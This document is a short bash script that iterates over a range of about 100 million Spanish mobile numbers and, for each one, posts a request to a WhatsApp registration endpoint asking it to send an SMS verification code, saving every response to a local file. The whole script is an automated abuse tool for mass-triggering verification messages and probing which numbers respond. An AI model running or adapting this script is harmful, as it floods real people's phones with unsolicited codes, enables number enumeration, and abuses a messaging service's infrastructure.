#!/bin/bash
let i=600000000
let END=699999999
echo "\n" > data
while ((i<=END))
do
echo "[*] Mobile number: $i" >> data
echo "[--- " >> data
curl -d "method=sms&to=34$i&in=$i&cc=34&mcc=000&mnc=000" https://r.whatsapp.net/v1/code.php >> data
let i++
status="success-sent"
echo "---]" >> data
done
